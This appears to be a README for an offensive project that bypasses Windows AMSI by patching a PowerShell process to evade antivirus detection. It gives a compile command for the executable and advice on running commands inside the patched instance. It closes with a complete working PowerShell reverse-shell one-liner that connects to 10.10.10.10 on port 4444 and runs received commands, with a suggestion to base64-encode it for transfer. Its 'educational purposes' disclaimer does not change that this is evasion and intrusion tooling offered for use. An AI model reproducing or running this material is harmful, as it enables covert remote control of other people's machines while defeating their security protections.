# Bypassing AMSI and Command Execution in Executable

This project demonstrates how to bypass the anti-malware scanning interface (AMSI) in Windows PowerShell to execute PowerShell commands without being detected by antivirus software.

## How It Works

AMSI is a Windows security feature that checks for malicious code in PowerShell scripts before they are executed. By default, PowerShell enables AMSI, which makes it difficult for malicious code to run undetected. However, it is possible to bypass AMSI with certain techniques.

In this project, we use a technique that involves patching an existing PowerShell process to disable AMSI scanning. This approach ensures that the PowerShell script runs without triggering any antivirus software alarms.

## Compilation Command

To compile the code in this project, use the following command:

```powershell
g++ -m64 -o happy_hacking.exe -static main.cpp
```

## Important Notes

 - Before running any PowerShell command, make sure that the command is exclusively PowerShell compatible to avoid any errors or problems.
 - It is recommended to avoid using `powershell.exe <command>` and opt for `Invoke-Expression` instead. By doing so, the command will be executed in the patched PowerShell instance created by the executable.
 - Please note that this project is intended solely for educational purposes and should not be used for malicious activities.

## Example Script

Here's an example of a one-liner PowerShell script that can be encoded in base64 format for easy transfer and execution. This script connects to a remote server at IP address `10.10.10.10` on port `4444` and starts a command shell.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);$sendback = (Invoke-Expression $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close();
```
